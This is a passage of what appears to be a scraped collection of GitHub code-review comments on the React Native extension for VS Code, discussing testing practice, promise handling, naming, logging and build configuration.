like:\nassert(mockedExecFunc.calledWith(\"plistbuddy set -c blah blah myfilename\"), \"plistBuddy did not attempt to set first\");\n. Based on this: http://sinonjs.org/docs/ it makes me wonder if this should be a mock instead of a stub:\nWhen to use mocks?\nMocks should only be used for the method under test. In every unit test, there should be one unit under test. If you want to control how your unit is being used and like stating expectations upfront (as opposed to asserting after the fact), use a mock.\nWhen to not use mocks?\nMocks come with built-in expectations that may fail your test. Thus, they enforce implementation details. The rule of thumb is: if you wouldn\u2019t add an assertion for some specific call, don\u2019t mock it. Use a stub instead. In general you should never have more than one mock (possibly with several expectations) in a single test.\n. We should add the name of the method you are testing to the name: setPlistProperty\n. Are we using this returns false?\n. I'd use this mockFS https://www.npmjs.com/package/mock-fs instead of implementing our own.\n. We should use assert.equal so we don't need to specify the message ourselves. A third-party assertion library could also work.\nhttps://nodejs.org/api/assert.html#assert_assert_equal_actual_expected_messageassert.equal\n. If you want to validate the parameters of the call, I'd use sinon here.\n. I think we should use a path that's a possible real path here like /Users/my_username/my_project/\n. I'd verify the full path of the file instead of just the extension.\n. I'd use the real values we actually use here.\nname = :RCTDevMenu:executorClass\nvalue = RCTWebSocketExecutor\n. I'd use /Users/my_username/Library/Developer/CoreSimulator/Devices/7f5305ef-9775-4b6e-acb4-186296371e82/data\n. I know. But if I'm going to test a single value, knowing that :RCTDevMenu:executorClass works gives me a lot more confidence than the fact that myProperty works. We should try to test the most important case for us, rather than a random case. The code could potentially break if you put a : on the string, or something else that happens with :RCTDevMenu:executorClass but not with myProperty.\nOn the other hand if myProperty breaks because it doesn't has a :, and we don't detect that, it won't cause any pain for the users, so it doesn't really matter that much.\n. I'd use some valid GUIDs in the amount that you normally find in a simulator here.\n. I think we should use a library for this.\nThese two seems reasonable candidates:\n- https://www.npmjs.com/package/adbkit-logcat\n- https://www.npmjs.com/package/adbjs\n  And I think we can use the licenses (I used https://github.com/davglass/license-checker and https://www.npmjs.com/package/nlf to make a quick check)\n- There is also this one: https://www.npmjs.com/package/appium-adb but it has a looooooooot of dependencies, and some have some weird stuff inside, so I'm guessing that's probably not an option.\n. Please define these lambda functions as private instance methods.\n. I think you can remove this deferred  and just chain the results of exectToString\n. I'd rename this to IDeviceStatus\n. I'd change status: to isOnline: true or false.\n. I'm not a big fan of doing this, but I'd change the condition to:\n(match = regex.exec(input)) != null to avoid the duplicated line in 30 and 33.\n. It might make sense to return a Dictionary instead of a list here, so you can more easily query for a specific device.\n. The && devices is unnecesary\n. You should use .some instead of .filter\n. You should use .some instead of .filter\n. remove devices && and activeDevices && \nI'd do activeDevices.length > 0 ? activeDevices[0].id instead of activeDevices[0] &&\n. Changed!\n. I don't think that having a class name starting with a verb is wrong. Still, I'm open to better name suggestions :)\n. It can, and there is no limit currently. Given that this is intended as a temporary measure until react-native returns proper exit codes, I'd leave it as it though. What do you think?\n. In the case of iOS, we can only find out the name of the bundle only after the app has been build or something similar, which happens when we execute run-ios, so we don't know the patterns when we call this command, only after it's \"finished\".\n. It's not unless we go and read their source code, and make sure that our list of failures is 100% complete. I don't think it's worth the effort to do that, this is more an \"heuristic\" rather than an exact solution, until we can convince react-native to return proper error codes in run-android and run-ios.\n. I think it was printed 10 time per second.\n. It's not. But given that this is a temporary patch I'm happy to leave it as is.\n. Removed!\n. deviceResolver.getConnectedDevices() never returns null, and this is a private method, so I think it's okay to add a \"non null parameters here\" precondition.\nIf we want to be prepared in case the code changes, I'd add an assert.notNull(devices) at the top of the method, explicitly verifying the precondition.\nIf we stop using preconditions and assumptions on our private methods, then we'll have to add null checks in every private method before using an argument which will be a nightmare.\n. I think it makes more sense to add a \"non null devices\" precondition to this method.\n. All this block is sync, so you can merge it with the next .then()\n. com.awesomeproject/.MainActivity is hardcoded\n. The method name doesn't match what the method does any more. We should either rename the method, or move the logic to different method.\n. We are releasing the global variables in the context. The issue is that our \"sandbox\" is just switching the global variables, so it's possible that the react-native logic is escaping the sandbox somehow, and then staying alive after we stop using that context.\nThe solution if that happened would be something like what you two are suggesting, but that would require a complete re-architecture of the debugger.\nStill, given that react-native seems to be handling the clean-up somehow, I'd argue to continue with this solution for the time being, until we discover an actual problem that can happen with this current implementation.\n. I see that line as:\n 'shell', 'am', 'start', '-n', packageName + '/.MainActivity'\n. Ok. Then the filename instead of the extension.\n. Fair enough! :)\n. I find it easier to think about 3 simple methods, rather than a single method with 2 lambdas (which appear as a big more complex method).\n. You could move line 27 to line 21, and then reuse cexec in line 22\n. If you use this.packageName here, you can extract the .then starting on line 30, and put it at the same level of the .then of line 25 removing one indentation level.\n. Thanks Jimmy! :)\n. Unless we have a memory leak, MakeOutcomeFailDependingOnOutput should be collected shortly after the process finishes executing, so I don't think that's neccesary.\n. I think we know the type of the parameter when we call this method, so instead of a switch we could have 3 methods and avoid the type checking:\ncreateFromOutputChannel\ncreateFromStream\ncreateFromConsole\n. Should we provide numbers for the warnings too?\n. Instead of using this if we should just initialize globalLogger in line 14 to new ConsoleLogger(), and let people overwrite it with a call to CreateGlobalLogger if they want to.\n. We are initializing the global logger with the output channel in this process, so we can just call Log.logMessage here, and remove logToOutputChannel given that this is the only caller.\n. Both = \"arg1 arg2 arg3\" and [\"arg1\", \"arg2\", \"arg3\"] should work. What do you mean?\n. It's not... My first implementation of this feature read the configuration from settings.json. I left this method because I think it's likely we'll use it in the future.\n. Is there an easy way to know when the debugging session ends?\n. In my tests I always saw a single output channel, so I'm guessing it gets reused.\n. I've just got it! Nice catch! :)\nI've fixed it by transforming the array into a string.\n. Done!\n. With this change we only use the outputChannel to create the isDebugeeProcess  flag.\nWe could pass that to the constructor instead, and don't require the outputChannel any more.\n. Is this method used?\n. Is this method used?\n. Is this method used?\n. Is this environment variable intended for the user? I think it'd be more consistent with VS Code style to read this from .vscode/settings.json\n. Could we add a method to the extension server GET_PROJECT_PATH? to get it easily? \nWe could also extract it from the program or outDir parameters if not.\n. We are returning \"\" for linux or other unknown systems. Will that work?\n. Fixed!\n. I tested it on my machine (Win10) and it worked. I'm not sure if it might break on a different version of windows.\n. Changed!\n. Moved!\n. Maybe we should rename it to make clear that the intent is to only use NPM CLIs here. That way it shouldn't break unless npm stops using this convention.\ngetNpmCliCommand(\n. :+1: \n. Remove this comment! :), This should make the script fail.\n. I think we should change \"Running\" for \"Started\". Which the current implementation if the packager dies or something, it'll still say Running. Started seems to be slightly more truthful in that we started it, but it doesn't imply so strongly what happened after that.\n. At the moment you are calling updatePackagerStatus( with parameters specified on the call site. I think it'd be simpler to just have two methods updatePackagerStatusToStarted() updatePackagerStatusToStopped() rather than this switch.\n. At the moment the parameter is always hard-coded on the call site. I think this would be simpler if we just used two methods: packagerWasStarted() packagerWasStopped() rather than this method with a parameter/switch.\n. I think it's easier to read, and it's also less code, with less control flow. What disadvantage do you see to using those two methods compared to the parameter/switch implementation?\n. Fixed!\n. Fixed!\n. Removed!\n. Instead of mocking logMessage I'd implement a MemoryLogger which appends the messages to log to a string or buffer, and then you can retrieve them.\n. The .spawn methods are used a lot, so I think we should test those too.\n. Printing the executing and finished text is an important part of the commandExecutor class, so I'd verify that those things are printed properly. executing echo 23423432 or a command that returns something constant might make that easier. Ideally we should also test that both stderr and stdout of the command are printed properly.\n. Because if we then change the signature of logMessage from: (message: string, formatMessage: boolean = true) to (formatMessage: boolean, message: string) or we make any kind of refactoring without introducing any bugs, the test using MemoryLogger would correctly pass, yet the one using stub.calledWith would incorrectly fail.\n. This would only work if the error happens during the first 300 milliseconds. It may catch a few cases, but I don't think this is a good solution for this issue.\n. I considered that option too, but given that we are using the internal logging as a complete different channel (because we can't print to the Chrome Developer Tools console), I think it makes more sense to have 2 different logging channels and levels. I can't see any scenario where a normal user would benefit from seeing this logs, unless he is actually developing/debugging the extension itself. If we go that route I think we'll end up with 10 different log levels with weird names, that will only confuse the users.\n. Why not keep this just as a string?\n. all the test have this line. Maybe we should put it in a setUp, or use a constant suite variable if you are happy assuming that this class has no state.\n. You have the same code on line 29. Can you extract it to a method or put it on a setUp?\n. I'm making a change in another PR where we'll use this class for the command palette too.\n. We need to be able to identify that single situation. Maybe you have multiple devices but the build fail because it has invalid Java Code. We only want that logic to run when the error is specifically that it has more than one device/emulator.\n. Ok, I'll make it part of the normal workflow for this PR.\n. As discussed offline, because of the success patterns, we need to do this on the .catch method, not on the .then\n. I didn't know that! I'm going to use prepublish then...\n. This kind of stuff keeps happening to me too :(. We need to find some tslint rule or some way of making the previous code not \"compile\" any more.\n. This seems a fairly long line. Can we split it so each line is no more than 140 characters long?\n. We should change this method to return { WebSocket, Q.Promise < void > }. This code has a potential race condition if the application starts to run before the 300 ms, because the this.socketToApp.send(stringified); line will fail.\n. I mean to do:\n\"string1\" + \n\"string2\" +\n\"string3\";\n. Changed!\n. Fixed!\n. The docs don't really say, but I'm choosing to believe that err will never be null. Why would you call a patherror event if you don't have an error?\n. I think I'd be better to have two messages: logStreamOutput and logStreamError so we don't need to pass the extra parameter around.\nStill, I think this is a good enough fix for this release, and we can make it nicer later.\n:+1:\n. I think it'd be better to leave the method spawn( to be a thin wrapper that turns node spawn into a promise friendly thing, and then have another method spawnEternalProcess( or something else that builds this delay functionality on top of the other simple spawn( method.\n. We should just return this result without converting it into a promise.\n. I think we should leave this signature to expect:\ncommand: string, args?: string[], options: ISpawnOptions = {}.\nIf you need to add an option, I'd modify options to be { customOptions: something, spawnOptions: something }\n. The implementation should be to resolve or reject when the process exits after it finishes. \"Equivalent\" to what Q.nfcall does.\n. As discussed with Jimmy offline, we have two cases we are using right now. We should probably have two methods:\n- spawnWaitUntilFinished(): ISpawnResult\n- spawnWaitUntilStarted(): ISpawnResult\n. We can do that, but given that we use commands and args 99% of the time, I think we should leave them as normal mandatory parameters. We can put the optional stuff inside an options parameter.\n. Will this verify the copyright of all source files? We want to run this for the gulpfile and other .js files that we have in the repo.\n. Is it okay if we have the copyright in the middle of the file?\nI also think that we probably don't want arbitrary spaces to appear after the first line...\n. I didn't know that! Thanks! :)\n. Isn't all this equivalent to:\nreturn sender.sendMessage(ExtensionMessage.START_PACKAGER); ?\n. I think this test will pass if sendMessage is a no-op.\n. I don't think this method is intended to be use this way: https://nodejs.org/api/assert.html#assert_assert_fail_actual_expected_message_operator\n. Using ErrorHelper.getInternalError\n. You are right, what I meant is that if you return without doing any work at all like:\nreturn Q({});\nI think the test will still pass\n. Close takes a callback. We should turn this into a promise, and wait until the server is fully closed.\n. Although basically identically, I'd do:\ncode === 0 ? callback() : callback(\"Error code: \" + code);\n. The stack trace would be useful too.\n. We have a tslint rule that validates that.\nIt makes it easier to avoid conflicts if you add another element to the array/object literal\n. Exactly, this is a debug-mode-only thing. In production the .map file won't be available, so the source-map-support line won't get executed. Even if for some miraculous reason the .map is there, we won't be shipping source-map-support in the .vsix because it's a dev dependency, so the require will still fail, we'll eat the exception, and the user will be none the wiser\n. Missed that.\nAdded \"out/test/common/*/.test.js\" as an extra parameter.\n. I only think we have these issues in a small number of cases (mainly variables for node modules [because we use classes that start with uppercase, so we don't have this issue for our own modules] and variables with getters/setters). So I'd rather rename the module to node and do something else with the variables with getters/setters.\n. If you create an app with react-native init MyAppLication react-native will set the package name to:\ncom.myapplication\nSo you can go and modify files to make it case sensitive, but react-native seems to be suggesting for it to be lower case... So if we don't find the androidManifest.xml file, I'd personally go with the Lower Case version.\nNow we also convert DefaultPackagePrefix  to lowercase.\n. You mean as another line, or rename line 3 to that?\n. At the moment I'm only using this with null.\nThe first time we need to use this and not return null, we can come back and modify it to support it (I basically didn't want to spend extra time trying to making it more generic, until we know that we do need it).\n. I like using the real Package class, so we can test more of the real code.\nIf we wanted to hide that knowledge from this class, we could start passing a serviceLocator parameter around instead of all the \"dependencies\", so this class would only know that the other classes uses services, but not which ones...\n. Fixed typo, but left the variable as-is.\n. It won't. Line 7 is not for Production, but for us, in case we are ever debugging the extension without source maps for some reason.\n. What do you think of adding (If relevant) instead?\nI don't want someone to think: It's optional, so I don't need to send it...\n. Changing to OS platform and version until I understand what you meant here.\n. Removed!\n. No idea. VS Code GO it's still using     \"vscode\": \"^0.10.7\" : https://github.com/Microsoft/vscode-go/blob/master/package.json#L46\nSo I'm guessing we are fine here?\n. I think this runs on node 0.12 on the build server, so I don't think we can uses classes just yet...\nI'll extract it to a function though...\n. Refactored the code to make it less misleading.\n. I was using the convention that we use camelCase for instance variables.\n. I know... It's just to be extra sure in case someone changes the other variable to something uppercase...\n. It's a bug! Thanks! :)\nFixed!\n. This method will be used on another PR for the test case:\nrunApp fails when the android project doesn't exist, and shows a nice error message.\nAt the moment I don't expect to find any files on the folder I'm deleting, so I prefer to call this method, because if a file appears there I'd like that test to fail, so I can verify what's happening.\n. Added:\nconsole.log(\"\\nTesting cases that don't match pattern: \" + pattern);\n. It's not. All the metadata is informational at the moment.\nI just wanted to say which was the original file that I modified to create this test, given that it's synthetic and not recorded.\n. Actually this line is meant to be our extension.\nI don't think we usually care about the react-native-cli version, it usually just passes stuff through to the react-native library.\n. Yes, that's on line 4.\nChanged first line to: \"React-Native VS Code extension version\"\n. That explains why I always fail :(\nFixing soon!\n. They were an error already with tslint, but now we are changing to the typescript implementation because it's newer and better.\n. Now it looks like:\nconstructor({childProcess = child_process /* = require(\"child_process\") /}\n. Added this comment:\n    /\n     * Delete 'dirPath' if it's an empty folder. If not fail.\n     \n     * @param {dirPath} path to the folder\n     * @returns {void} Nothing\n     */\n. You are right! :)\n. In this case, this is a snapshot of the result of react-native init, so we don't want to modify this code\n. Given that we'll show the message if the react-native package is not installed I'd change this to something like:\nReact Native Tools extension can't work without React Native 0.19.0 or later on node_modules/react-native.\n. :+1: \n. Should we consider renaming it to MS_INTERNAL_USER or something similar?\n. What if for some weird reason 2 different users open the same project at the same path?\n. Added:\n// Nothing needed here\n. I think it'd be better to use HostPlatform just for actual differences in the OSes, so then we can port it directly to other projects. Given that this is a method built on top of OS specific functionality, I think it's better to keep it in a separate vscode-reactnative specific class.\n. The code that use this class should be independent on how we talk with the extension. You want to say extension.startPackager() you don't really care if you send it through a socket, or if tomorrow we change it and we put it in the same process for some reason.\nI also like putting all the \"untyped\" code in a single place, so we can just use it blindly in any other places (It's easy to send the wrong arguments to .sendMessage() because of the any[] type), here it's at least in a single place, which I think will make it easier to make sure that all the calls are correct.\n. Changed\n. Fixed\n. as far as I know that's the right environment variable to get the username in Windows/Linux/OSX\n. args is marked as mandatory in: MessageWithArguments.\nAnother option would be to mark it as optional, and make sure all the code expects it to possible be null.\n. Changed\n. No, for some reason typescript wasn't complaining about me sending a \"string\" in place of the array. So sendMessage(Message, \"myParameter\");  compiled but failed horribly at runtime\n. In the this context I think it makes sense to consider multiple packagers running, and the implies only one, so I'm not convinced it's the right choice here.\n. Whatever you two decide is fine by me.\n. Wouldn't it be better to throw an exception here? We probably want to tell the user stringYouPutSomewhere is not recognized as a valid platform name.\n. can we rename this to canRunApplications(\"ios\") or canRunProjects(\"ios\") ?\n. I'd be more specific and say \"Running platform\" or \"Running projects of platform\".\n. This code is similar to the one in src/debugger/launcher.ts. Can we move it to a common place to eliminate the duplicated code?\n. But we still need to have that logic each time we call this method. Why not just put it inside the method and forget about it on the callers (basically assume that you got a valid platform)?\n. Inlined in the constructor.\n. Changed\n. I completely forgot about that class. Thanks! :)\n. Added\n. I agree it's not directly the responsibility of the ScriptImporter , but I don't think it's the appWorker responsibility either, and given that it's a much more complex class, I'd like to try to keep it as simple and thin as possible. Where do you think we should put this method?\n. No. I just verified that Command Palette: Run-Android didn't work before and it seems to be working now.\n. I'm not sure. The problem is that we are kinda using promises as events actually. waitForStart and waitForFinish are great names for events (or Semaphores), but they are kind of weird for promises. Promises are more about getting a result, so for promises it might make more sense to call it startupResult or processResult or outcome. So I'm not sure if we should go with event kind of names, or promises kind of names.\nIf you are convinced these names make more sense, I'll change them!\n. Fixed\n. At the moment we don't need to initialize it on the constructor, although that will probably change when we add more tests to CommandExecutor, and then we'll change this to the constructor.\n. Done!\n. Sadly I cannot reuse it due to the way it's defined on NodeJS typings.\nI missed that I had duplicated it on recording.ts though.\nChanged this to import it from recording.ts\n. I'm sleepy and you are right ;-)\nFixed!\n. I agree that from this class perspective it's a lot clearer to split it in two. But from the client's perspective, I think it's a lot nicer to be able to intermix the events, because then you can put the events in the expected order like:\n```\n      [\n            {\n                wholeOutputPattern: /compiled/,\n                action: () => this.compiled(),\n            },\n            {\n                eventPattern: /Installed on a device/,\n                action: () => this.installOnDevice(),\n            },\n            {\n                wholeOutputPattern: /launched/,\n                action: () => this.launched(),\n            },\n        ]\n```\ninstead of having to define two lists like:\n```\n      [\n            {\n                wholeOutputPattern: /compiled/,\n                action: () => this.compiled(),\n            },\n            {\n                wholeOutputPattern: /launched/,\n                action: () => this.launched(),\n            },\n        ]\n   [\n        {\n            eventPattern: /Installed on a device/,\n            action: () => this.installOnDevice(),\n        },\n    ]\n\n```\nSo I'd suggest to keep it as is, so it's easier to use this class.\n. I personally prefer making it as nice as possible for the client rather than the implementator, because I expect that we are going to have to call this more times that we need to implement it.\n@hamiltonia @dlebu @joshuaskelton @MSLaguana What do you guys think is better?\n. Changed!\n. Changed!\n. Changed!\n. This has nothing to with do multiple VS Code instances. This is related to the fact that if we use port forwarding the RN App thinks that the packager is at localhost:8081 when it's actually on localhost:8090 in the Computer, so we need to change the port when we download the scripts to actually find them.\n. I think we should share a single heading for both Steps to reproduce: and Actual Behavior:. The more headings we ask here the less likely the user will fill the things we are asking him/her.\n. It's still used for gulp test --pattern\n. I'd move this message under the generator.step(\"prewarmBundleCache\") line, so it'll make more in the weird case we get a crash in that line. (Same for the other messages you added)\n. From the user perspective the Debugging Session started when he pressed the button. I'd change this to something along the lines of: \"Starting the worker which will run the react-native application logic.\"\n. At the moment we don't need any state, but we'll need some in the future when we add more features to this class. I wanted to use this to leave the devices as a dictionary {deviceId: {}, otherDeviceId: {}} rather than use an array [deviceId, otherDeviceId] which we'll need to change to a dictionary when we improve this.\n. should we add a toLowercase?\n. I think you should either re-throw the same error, or use a nested error here\n. This method seems to be sync. Why are we returning a promise?\n. Removed interface\n. Yes, the expected usage is:\nconst testWithRecordings = new RecordingsHelper(() => recordingConsumer).test\n.  decided to load the recordings of run-android from a file, and that we wanted to be able to run the same test with multiple different recordings... This class is to help do that. Then we can do stuff like:\n     testWithRecordings(\"expects to do some test thing\",\n    [\n        \"path/to/recording/from/windows\",\n        \"path/to/recording/from/mac\"\n    ], () => {\n        // test code here\n    });\n. We can let is as-is for now, and revisit the decision if it becomes an issue\n. I think this solution is good enough for now. If the team feels strongly about changing this to a better design I can spend some time doing that, if not I'd leave it as-is for the time being.\n. I choose to do it this way because it needs to support the TestUsingRecording interface which is a function + 2 methods.\nWe could also do it with a member function, but then we'd need to cast it to  to assign the sub-functions, and also make sure we don't use \"this\" inside that member, given that we are going to pass it around, and bind will probably break the sub-member function.\n@dlebu I'm fine with either approach, if you think that the member function is better I'll change it to that.\n. It's not. It's used on the run-android tests to mock the file system. I added it in this PR so the .d.ts file won't clutter the other PR.\n. Nice catch!\nI need to fix the done callback and the this keyword because they probably won't work.\nThe beforeEach() and afterEach() should work fine though.\n. Now we'll show an error if they try to use the done: callback, and we'll pass the proper this parameter to the test-function\n. I'm fine with either option. If the rest of the team agrees with not using this \"private\" keyword feature, I'll change the code to not use it. @hamiltonia @dlebu @MSLaguana @joshuaskelton What do you think?\n. @guillaumejenkins If they want to do such a test, they can go and change the exception for a valid implementation of the method that supports it. Given that we currently aren't using it, I think it's okay to leave the exception for the time being.\n. I'd interpolate platformName in this string so it's easier for the user to act on this error.\n. I'd rename this to validateTargetPlatformSupport\n. This is sync, you can merge it with the next .then block.\n. I'd add it to runAndroid just for consistency\n. Can we bump it to \"0.1.5-dev\" or 0.1.5.1234\" or something to mark it as an internal/dev version?\n. But we decided to split the PRs so it's easier to review them.\n. Shouldn't this check run before line 33?\n. changed!\n. changed!\n. changed!\n. Fixed!\n. Yes, I missed that.\nChanged for:\n            androidPlatform = createAndroidPlatform(genericRunOptions);\nAnd move functions before the setup();\n. Fixed!\n. Changed!\n. Changed!\n. Fixed!\n. In the react-native help it says that this path is relative the the project root. I think it'd be clearer if we renamed this argument to iosRelativeProjectPath, and then in iOSPlatform.ts we can combine it with projectPath to create the value iosProjectPath.\n. I'd initialize this variable with the proper value with something like:\nstatic DEFAULT_IOS_PROJECT_RELATIVE_PATH = \"ios\";\nthis.iosProjectPath = path.join(this.projectPath, !ifNullOrUndefined(this.runOptions.iosProjectPath) ? this.runOptions.iosProjectPath : iOSPlatform.DEFAULT_IOS_PROJECT_RELATIVE_PATH);\n. I think you should pass the absolute iosProjectPath to this method instead. I think that most ios methods only need to know the location of the ios project, so you'll be able to remove the projectRoot in most of them if you pass the iosProjectPath instead.\n. We've seen some example projects where this file is not called index.ios. Also, this won't work for Android. Why is this change necessary?\n. If you specify on purpose iosRelativeProjectPath: \"\" this will use \"ios\" instead.\n. I think it'd be simpler to remove the if, and just pass --project-path always to run-ios\n. What's the advantage of that implementation over the current implementation?\nIf I remember correctly, in the Movies example app, this file is called Movies.ios.map, so that change will break that example.\n. All the places where you are using that regexp are iOS related code, and they are all using projectRoot + \"ios\" in every case except for calls to new CommandExecutor(this.projectRoot) which I don't think it'll break if you also change it to use projectRoot + \"ios\" instead.\nI think it'd be better to just pass iosProjectRoot to:\nPlistBuddy.getBundleId\nXcodeproj.findXcodeprojFile\nnew Compiler\nnew DeviceDeployer\nnew DeviceRunner\nAnd then modify the code where they later add the \"ios\" to the path, so the code still keeps working (as in this line: https://github.com/mroswald/vscode-react-native/blob/feat/support-iosprojectpath-param/src/common/ios/plistBuddy.ts#L29 )\n. Yes\n. The default in this case would be \"ios\" (That what we'll use if they don't provide this property).\n. Shouldn't this be this.runOptions.iosRelativeProjectPath?\n. You can just use this.getBundleId() here\n. I think you probably need to modify Compiler, DeviceDeployer, IOSDebugModeManager, and DeviceRunner so they don't append the \"ios\" subfolder any more to the paths...\n. This is a future improvement we should do when we have time and the investment makes sense. I don't think it's worth it to create a task at the moment.\n. They are aware, but I'm not sure when or if this is going to get fixed: https://github.com/evanw/node-source-map-support/issues/131\n. I agree it's hackish, but I'd still like to give using the stack traces translator a try. If the team is not convinced afterwards, then we can just remove it altogether.\n. That's a good idea! I'll change it\n. You can remove the call to path.join\n. Ok! I'll do that\n. I can change it to a global variable if you think that's better. But I want to use a string, instead of a number so it's easy to understand what's happening\n. Please add some context as comments explaining that we need this for realm, links to the issue, etc...\n. This seems to be using private methods. I'm guessing you are doing this because we can't achieve the same effect with public ones. Please add some comments explaining what are you doing here, and how did you figure it out, so it's easy in the future to re-implement this if they change or remove _nodeModulePaths and/or .paths.\n. Change resolve for require\n. Can you get something from the q module, and send it on the testResponse so we can validate that the proper q module was load? (Currently the test would pass if debug.require is a no-op)\n. If possible, you should convert this into a Q promise and return it. If you are not returning a promise, then it doesn't make sense to return Q.Promise\n. You should finish all promise chains calling .done() so rejected promises that are not handled by anyone, will get thrown as unhandled exceptions\n. This catch is a no op. When you throw inside a promise/then/catch handler, that's equivalent to \"reject\" the promise chain or return Q.reject(e); This exception won't be catched by your sync catch\n. You can use a NestedError here, to use your custom message, but preserve the information of the original exception\n. If you are not going to use the value I'd use Q.Promise instead.\n. Will Q automatically convert the vscode promise to a Q promise here?\n. I'd also put process.argv or part of it so they know with which parameters it was called\n. I think the default value should be 1\n. I think it's better to always use the brackets {} for clarity\nif (fileInfo.length >= 2) {\n  lineNumber = parseInt(fileInfo[1]);\n}\n. I've just remembered that we have new EntryPointHandler().runApp(\nto handle the try/catch nested error, done etc... on the entry points. You should refactor your code to use that class instead.\nYou should also find out what kind of telemetry we expect from this and implement it too\n. You should use RemoteExtension here instead (you'll have to add your new message)\n. You need one for each OS\n. This should probably return Q.Promise\n. I think you could achieve the same effect in a simpler way by using the rejection of line 38 here instead\n. I'd rename this to get\"Path\"ForRNParentWorkspace\n. I'd use a regexp to extract both values. Something along the lines of\n^([^:]+):([0-9]+)$\n. We currently should be able to distinguish them based on the error message\n. Isn't it possible to provide something more specific than any?\n. Please rename this to something along the lines of: tellUserToUpdateTypescriptTSDKInSettingsJson\n. This method seems to be sync now\n. I think that should validate that this is either \"true\" or \"false\" and throw an error otherwise\n. Wrong error code. Please eliminate duplicated code.\n. Is it actually possible for this condition to be false?\n. I think it'd make sense to extract this condition to the caller method\n. Is tsdkPath !== null actually needed?\n. The this.isString(value) is not neccesary\n. We should show a message to the user and explain to him/her, please do  in your tsconfig.json file to enable \n. I'd replace:\n\"for a better source mapping\"\nfor\n\"for better source-mapping support\"\nand\n\"required if want TypeScript supports\"\nfor\n\"required if you want TypeScript support\"\n. ",
    "dlebu": "LGTM! Ship it!\n. Thanks everyone!\n. LGTM!\n. Thanks for the review!\n. LGTM!\n. @digeff Thanks for the extra fixes. LGTM!\n. Minor comments, otherwise LGTM!\n. @MSLaguana I addressed all comments, please take a look. I made the cleanup on init asynchronous, although, in theory, that should never be executed. The cleanup at disposal time is still synchronous, please see my comment.\n. @MSLaguana Thanks for the review! Merging.\n. :+1: \n. Some suggestions on naming, otherwise LGTM!\n. @nisheetjain @digeff @meenakb @MSLaguana \n. Thanks guys! \n. LGTM!\n. Assuming that the dependency list contains all the right modules, LGTM!\n. :+1: \n. Thanks everyone, merging to master.\n. @MSLaguana I introduced a new tslint rule in my latest PR (public before private).\n. @MSLaguana I should have merged master to my branch before pushing the code. Thanks for the review!\n. @digeff moved the method in his latest PR so I moved it back and made it private.\n. LGTM! Whenever I move a file in my changes, it appears to be deleted and then added. What magic command did you use to make the move so minimal?\n. Minor comments, otherwise LGTM. Let's sync up during stand-up with everybody and talk about optimizations and the attaching story we chatted about this morning.\n. :+1: \n. What was the exact issue with the source maps?\n. I think we should not open source our code like this. We need a proper build task. I looked into the issue this morning and found a fix. Feel free to merge it in your PR:\njavascript\ngulp.task('build', function () {\n    var tsProject = ts.createProject('src/tsconfig.json');\n    return tsProject.src()\n        .pipe(sourcemaps.init())\n        .pipe(ts(tsProject))\n        .pipe(sourcemaps.write('.', {\n            includeContent: false,\n            sourceRoot: function (file) {\n                return path.relative(path.dirname(file.path), __dirname + '/src');\n            }\n        }))\n        .pipe(gulp.dest(outPath));\n});\n. Looks good. Thanks for merging the change!\n. :+1: \n. LGTM!\n. :+1: \n. Closing the issue as this was by design. I was trying to connect back from the emulator after running the project, not debugging it, which is not supported at the moment.\n. Does this change fix any issue? If not, we should hold it until after the preview release.\n. I added one more comment, otherwise LGTM!\n. I think IF this is just a cosmetic refactoring and does not fix any bugs, we should merge it after the preview release.\n. @nisheetjain @MSLaguana @meenakb @guillaumejenkins @digeff \n. Updated the PR with the facebook equivalent logic - we use the same regex and only look in the expected location for the AndroidManifest file.\n. @digeff @MSLaguana waiting for your sign off.\n. Thanks everyone!\n. :+1: \n. LGTM!\n. :+1: \n. LGTM! Does it still make sense to keep the sample application around? Can we replace the sample with documenting how to debug the extension once it's installed?\n. I met with @MSLaguana and @digeff yesterday and we decided on the following:\n- we send messages to the server by POSTing to http://localhost:PORT/MESSAGE_NAME\n- extra parameters will be sent in the request body\n- the server port will be configurable in launch.json\nThe changes are in, please take a look.\n. Thanks everyone. Merging to master.\n. :+1: \n. Looks good to me.\n. :+1: \n. The change looks good. Can you rename the top folder from SampleApplication to sample-application (or just sample) to match the other folders?\n. I think that in order to have consistent naming and minimal changes we should:\n- keep files in camel case\n- change folder names to lower case and use - as a separator\n. :+1: , minor comment on the class name\n. LGTM! Thanks Meena!\n. :+1: \n. I think this looks good. We can tweak the way we write tests as we go, but this is fine as the foundation for future tests.\n. LGTM!\n. LGTM! @MSLaguana Shouldn't we keep files that do not need to use vscode in /common? We can always use them from the extension context anyway.\n. This PR should be merged only after @meenakb's awesome logging refactoring goes in.\n. Because the logging interface is changing.\n. LGTM!\n. @panarasi @MShamiltonia Currently this is enabled only for debugging. Do we want the same behavior (minus the target device), when we use the command palette?\n. Thanks everyone. Merging to master.\n. Hi @lokinfey, thanks for reporting this issue. Can you give us a little more details about your scenario? We are insterested in the following:\n- What version of VSCode are you using?\n- Are you running multiple instances of VSCode at the same time? (multiple react projects opened in different VSCode windows)\n- Are you running an external packager process or the one inside VSCode?\n- Is there another process using your 8081 port? That is the default port of the packager.\n. #115 should fix this issue as well\n. :+1: \n. Thanks everyone!\n. :+1: \n. Looks good to me. Thanks for making this change.\n. :+1: \n. LGTM!\n. Minor comment, LGTM.\n. Beautiful refactoring! LGTM!\n. :+1: \n. Thanks everyone, merged to master.\n. Some questions:\n- How much time are we actually saving by adding this new dev dependency?\n- Is this necessary or just nice to have? I feel like the product is pretty stable nowadays.\n- Will this work for all files in the extension context, or just the main one?\n. Looks good. I would change the path from myReactNative022Project to sampleReactNative022Project.\n. Still waiting for you addressing the comments on this one. I believe we agreed on tasks instead of parameters, and default production, not debug.\n. Please double check it works as expected before merging. Otherwise LGTM!\n. :+1: \n. :+1: \n. Thanks for fixing this scenario and let's try to keep changes to a minimum next time we are fixing bugs. Aside from the comments, LGTM. :+1: \n. LGTM, aside from the typings file that should be in the other PR.\n. Thanks everyone!\n. The change looks good, you should at least minimally test the other affected scenarios (iOS) to make sure you are not breaking them before merging the PR.\n. :+1: Ship it!\n. :+1: \n. Merging to master. Thanks everyone!\n. LGTM!\n. Try this:\n`` javascript\ngulp.task('build', [\"check-imports\", \"check-copyright\"], function (callback) {\n    var tsProject = ts.createProject('tsconfig.json');\n    var isProd = options.env === 'production';\n    var preprocessorContext = isProd ? { PROD: true } : { DEBUG: true };\n    log(Building with preprocessor context: ${JSON.stringify(preprocessorContext)}`);\n    return tsProject.src()\n        .pipe(preprocess({ context: preprocessorContext })) //To set environment variables in-line\n        .pipe(sourcemaps.init())\n        .pipe(ts(tsProject))\n        .on('error', function 